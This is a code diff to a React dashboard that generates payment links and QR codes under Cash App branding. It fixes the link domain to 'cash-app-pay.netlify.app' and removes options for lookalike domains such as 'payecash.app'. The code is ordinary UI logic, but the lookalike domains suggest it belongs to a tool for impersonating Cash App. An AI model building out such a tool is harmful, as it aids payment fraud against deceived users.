@@ -14,8 +14,11 @@ import imgLight from '../asset/cashapp_light.png';
 export const DashboardCards = () => {
   const [paymentLinks, setPaymentLinks] = useState([]);
   const [linkIdInput, setLinkIdInput] = useState("");
-  // ★ amount state সরানো হয়েছে — আর ডিফল্ট ১০ সেভ হবে না
-  const [selectedDomain, setSelectedDomain] = useState(window.location.origin);
+  
+  // ★ Netlify ডোমেইন ডিফল্ট এবং ফিক্সড করে দেওয়া হলো
+  const NETLIFY_DOMAIN = "https://cash-app-pay.netlify.app";
+  const [selectedDomain, setSelectedDomain] = useState(NETLIFY_DOMAIN);
+  
   const [newLinkTheme, setNewLinkTheme] = useState('light');
   const [showQrFor, setShowQrFor] = useState(null);
 
@@ -218,9 +221,8 @@ export const DashboardCards = () => {
 
     const { email, userId } = getAuth();
     const trimmedId = linkIdInput.trim();
-    const finalUrl = `${selectedDomain}/${trimmedId}`;
+    const finalUrl = `${NETLIFY_DOMAIN}/${trimmedId}`;
 
-    // ★ amount আর পাঠানো হচ্ছে না
     const newLinkData = {
       name: trimmedId,
       url: finalUrl,
@@ -308,7 +310,7 @@ export const DashboardCards = () => {
         theme: currentLink.theme,
         template: currentLink.theme,
         name: currentLink.name,
-        url: `${selectedDomain}/${currentLink.name}`
+        url: `${NETLIFY_DOMAIN}/${currentLink.name}`
       });
 
       Swal.fire({
@@ -361,14 +363,12 @@ export const DashboardCards = () => {
                 onChange={(e) => setSelectedDomain(e.target.value)}
                 className="w-full sm:w-auto px-3 py-2 bg-gray-50 border border-green-500 rounded-xl text-xs font-medium text-gray-700 outline-none focus:ring-2 focus:ring-green-100 cursor-pointer shadow-sm"
               >
-                <option value={window.location.origin}>{window.location.origin}</option>
-                <option value="https://www.payecash.app">https://www.payecash.app</option>
-                <option value="https://www.payin-cash.app">https://www.payin-cash.app</option>
+                <option value={NETLIFY_DOMAIN}>{NETLIFY_DOMAIN}</option>
               </select>
             </div>
 
             {paymentLinks.map((item) => {
-              const currentLinkDisplay = `${selectedDomain}/${item.name}`;
+              const currentLinkDisplay = `${NETLIFY_DOMAIN}/${item.name}`;
               const isGreenTheme = item.theme === 'green';
               const isQrOpen = showQrFor === item._id;
 
